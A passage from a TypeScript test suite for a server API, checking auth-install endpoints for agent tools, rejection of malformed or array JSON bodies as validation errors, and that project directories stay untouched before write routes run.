        expect((await res.json()).status).toBe('success')
      }, { timeout: 10_000, interval: 50 })
    })

    it('rejects starting an install for opencode', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/auth/opencode/install/start', withAuth({ method: 'POST' }))
      expect(res.status).toBe(400)
    })

    it('404s polling an unknown install; cancel is a no-op 204', async () => {
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const get = await client.auth.install[':id'].$get({ param: { id: 'nope' } })
      expect(get.status).toBe(404)
      const cancel = await client.auth.install[':id'].cancel.$post({ param: { id: 'nope' } })
      expect(cancel.status).toBe(204)
    })
  })

  describe('body parsing', () => {
    it('malformed JSON maps to VALIDATION 400', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/project/add', withAuth({
        method: 'POST',
        body: '{not-json',
      }))
      expect(res.status).toBe(400)
      const body = await res.json() as { error: { code: string } }
      expect(body.error.code).toBe('VALIDATION')
    })

    it('array body is rejected as VALIDATION', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/project/add', withAuth({
        method: 'POST',
        body: JSON.stringify([]),
      }))
      expect(res.status).toBe(400)
    })
  })

  // Ensure the helper path fixtures don't leak if we add them later.
  it('write routes do not touch state before invocation', async () => {
    expect(await fs.readdir(getProjectsDir()).catch(() => [])).toEqual([])
    expect(projectDir('never')).toContain('never')
    expect(claudeDir('never')).toContain('claude')
    expect(codexDir('never')).toContain('codex')
  })
})
